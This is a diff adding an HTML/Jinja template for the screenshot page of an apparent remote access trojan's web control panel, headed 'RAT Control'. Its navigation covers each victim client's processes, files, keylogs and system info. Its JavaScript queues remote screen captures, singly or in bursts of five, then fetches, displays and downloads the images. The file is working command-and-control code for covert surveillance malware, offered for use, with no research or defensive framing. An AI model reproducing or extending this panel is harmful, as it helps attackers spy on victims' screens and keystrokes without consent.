@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screenshot - {{ client_id[:16] }}...</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='dashboard.css') }}">
+    <style>
+        .screenshot-container {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 30px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .screenshot-img {
+            max-width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            margin-top: 20px;
+        }
+        
+        .screenshot-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .screenshot-card {
+            background: #252540;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .screenshot-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.3);
+        }
+        
+        .screenshot-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        
+        .screenshot-card-info {
+            padding: 15px;
+            color: #a0a0b0;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h2>🎯 RAT Control</h2>
+        </div>
+        <nav class="nav-menu">
+            <a href="/admin/dashboard" class="nav-item">
+                <span class="icon">🏠</span>
+                <span>Dashboard</span>
+            </a>
+            <a href="/admin/processes/{{ client_id }}" class="nav-item">
+                <span class="icon">⚙️</span>
+                <span>Processes</span>
+            </a>
+            <a href="/admin/files/{{ client_id }}" class="nav-item">
+                <span class="icon">📁</span>
+                <span>Files</span>
+            </a>
+            <a href="/admin/keylogs/{{ client_id }}" class="nav-item">
+                <span class="icon">⌨️</span>
+                <span>Keylogs</span>
+            </a>
+            <a href="/admin/screenshot/{{ client_id }}" class="nav-item active">
+                <span class="icon">📸</span>
+                <span>Screenshot</span>
+            </a>
+            <a href="/admin/system/{{ client_id }}" class="nav-item">
+                <span class="icon">ℹ️</span>
+                <span>System Info</span>
+            </a>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <h1>📸 Screenshot Manager</h1>
+            <div class="header-actions">
+                <button class="btn btn-primary" onclick="takeScreenshot()">📸 Take Screenshot</button>
+                <button class="btn btn-primary" onclick="takeMultipleScreenshots()">📸📸 Multiple (5)</button>
+                <a href="/admin/dashboard" class="btn btn-primary">⬅️ Back</a>
+            </div>
+        </header>
+
+        <div class="client-info" style="background: #1a1a2e; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+            <strong>Client:</strong> {{ hostname }} ({{ username }}) - <span class="status-{{ 'online' if is_online else 'offline' }}">{{ '🟢 Online' if is_online else '🔴 Offline' }}</span>
+        </div>
+
+        <div class="screenshot-container" id="screenshotContainer">
+            <div style="font-size: 4em; margin-bottom: 20px;">📷</div>
+            <h2>Ready to capture</h2>
+            <p style="color: #a0a0b0; margin-top: 10px;">Click "Take Screenshot" to capture the remote screen</p>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='main.js') }}"></script>
+    <script>
+        const clientId = '{{ client_id }}';
+
+        async function takeScreenshot() {
+            try {
+                document.getElementById('screenshotContainer').innerHTML = '<div class="loading">Capturing screenshot...</div>';
+                
+                const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'take_screenshot'})
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (!cmdData.success) throw new Error('Failed to queue command');
+                
+                showNotification('Screenshot requested. Waiting for response...', 'info');
+                
+                // Wait for result
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                const resultResponse = await fetch(`/admin/command_result/${cmdData.command_id}`);
+                const resultData = await resultResponse.json();
+                
+                if (resultData.success && resultData.result) {
+                    displayScreenshot(resultData.result);
+                } else {
+                    document.getElementById('screenshotContainer').innerHTML = '<div class="loading">❌ Failed to capture screenshot</div>';
+                }
+            } catch (error) {
+                showNotification('Error: ' + error.message, 'error');
+            }
+        }
+
+        async function takeMultipleScreenshots() {
+            try {
+                document.getElementById('screenshotContainer').innerHTML = '<div class="loading">Capturing multiple screenshots...</div>';
+                
+                const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'take_screenshot',
+                        data: {count: 5, interval: 2}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification('Multiple screenshots requested...', 'info');
+                    setTimeout(() => {
+                        document.getElementById('screenshotContainer').innerHTML = `
+                            <div style="font-size: 4em; margin-bottom: 20px;">📸</div>
+                            <h2>Capturing screenshots...</h2>
+                            <p style="color: #a0a0b0; margin-top: 10px;">Check the downloads folder for saved images</p>
+                        `;
+                    }, 2000);
+                }
+            } catch (error) {
+                showNotification('Error: ' + error.message, 'error');
+            }
+        }
+
+        function displayScreenshot(screenshot) {
+            const container = document.getElementById('screenshotContainer');
+            
+            if (screenshot.image_data) {
+                container.innerHTML = `
+                    <h2>Screenshot Captured</h2>
+                    <p style="color: #a0a0b0; margin: 10px 0;">Timestamp: ${screenshot.timestamp || 'Unknown'}</p>
+                    <img src="data:image/png;base64,${screenshot.image_data}" class="screenshot-img" alt="Screenshot">
+                    <div style="margin-top: 20px;">
+                        <button class="btn btn-primary" onclick="downloadScreenshot('${screenshot.image_data}')">💾 Download</button>
+                        <button class="btn btn-primary" onclick="takeScreenshot()">🔄 Take Another</button>
+                    </div>
+                `;
+            } else {
+                container.innerHTML = '<div class="loading">❌ No screenshot data received</div>';
+            }
+        }
+
+        function downloadScreenshot(base64Data) {
+            const link = document.createElement('a');
+            link.href = 'data:image/png;base64,' + base64Data;
+            link.download = `screenshot_${Date.now()}.png`;
+            link.click();
+            showNotification('Screenshot downloaded', 'success');
+        }
+    </script>
+</body>
+</html>
